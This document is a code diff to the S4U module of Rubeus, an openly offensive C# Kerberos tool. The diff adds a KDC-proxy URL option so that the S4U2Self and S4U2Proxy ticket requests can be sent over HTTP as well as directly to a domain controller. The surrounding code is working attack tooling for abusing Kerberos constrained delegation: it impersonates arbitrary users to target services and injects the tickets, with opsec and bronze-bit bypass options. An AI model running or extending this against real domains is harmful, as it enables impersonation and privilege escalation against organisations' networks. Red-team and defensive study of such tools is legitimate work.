@@ -11,10 +11,10 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null)
         {
             // first retrieve a TGT for the user
-            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac);
+            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac, proxyUrl);
 
             if (kirbiBytes == null)
             {
@@ -30,9 +30,9 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "")
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
@@ -48,7 +48,7 @@ namespace Rubeus
                 if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)
                 {
                     Console.WriteLine("[*] Loaded a TGS for {0}\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
-                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, opsec);
+                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, opsec, proxyUrl);
                 }
                 else
                 {
@@ -75,7 +75,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType);
+                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType, proxyUrl);
                         if (self == null)
                         {
                             Console.WriteLine("[X] S4U2Self failed, unable to perform S4U2Proxy.");
@@ -84,12 +84,12 @@ namespace Rubeus
                     }
                     if (String.IsNullOrEmpty(targetSPN) == false)
                     {
-                        S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self, opsec);
+                        S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self, opsec, proxyUrl);
                     }
                 }
             }
         }
-        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false)
+        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null)
         {
             Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
@@ -112,8 +112,6 @@ namespace Rubeus
             byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
 
-            string dcIP = Networking.GetDCIP(domainController);
-            if (String.IsNullOrEmpty(dcIP)) { return; }
             Console.WriteLine("[*] Building S4U2proxy request for service: '{0}'", targetSPN);
             TGS_REQ s4u2proxyReq = new TGS_REQ(!opsec);
 
@@ -204,8 +202,24 @@ namespace Rubeus
 
             byte[] s4ubytes = s4u2proxyReq.Encode().Encode();
 
-            Console.WriteLine("[*] Sending S4U2proxy request");
-            byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
+            byte[] response2 = null;
+
+            if (String.IsNullOrEmpty(proxyUrl))
+            {
+                string dcIP = Networking.GetDCIP(domainController);
+                if (String.IsNullOrEmpty(dcIP)) { return; }
+
+                Console.WriteLine("[*] Sending S4U2proxy request to domain controller {0}:88", dcIP);
+
+                response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
+            }
+            else
+            {
+                Console.WriteLine("[*] Sending S4U2proxy request via KDC proxy: {0}", proxyUrl);
+                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(s4ubytes);
+                message.target_domain = domain;
+                response2 = Networking.MakeProxyRequest(proxyUrl, message);
+            }
             if (response2 == null)
             {
                 return;
@@ -424,7 +438,7 @@ namespace Rubeus
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
         }
-        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial)
+        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null)
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -433,15 +447,26 @@ namespace Rubeus
             byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
 
-            string dcIP = Networking.GetDCIP(domainController);
-            if (String.IsNullOrEmpty(dcIP)) { return null; }
-
             Console.WriteLine("[*] Building S4U2self request for: '{0}@{1}'", userName, domain);
 
             byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser, false, false, opsec);
 
-            Console.WriteLine("[*] Sending S4U2self request");
-            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
+            byte[] response = null;
+
+            if (String.IsNullOrEmpty(proxyUrl))
+            {
+                string dcIP = Networking.GetDCIP(domainController);
+                if (String.IsNullOrEmpty(dcIP)) { return null; }
+                Console.WriteLine("[*] Sending S4U2self request to {0}:88", dcIP);
+                response = Networking.SendBytes(dcIP, 88, tgsBytes);
+            }
+            else
+            {
+                Console.WriteLine("[*] Sending S4U2self request via KDC proxy: {0}", proxyUrl);
+                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(tgsBytes);
+                message.target_domain = domain;
+                response = Networking.MakeProxyRequest(proxyUrl, message);
+            }
             if (response == null)
             {
                 return null;
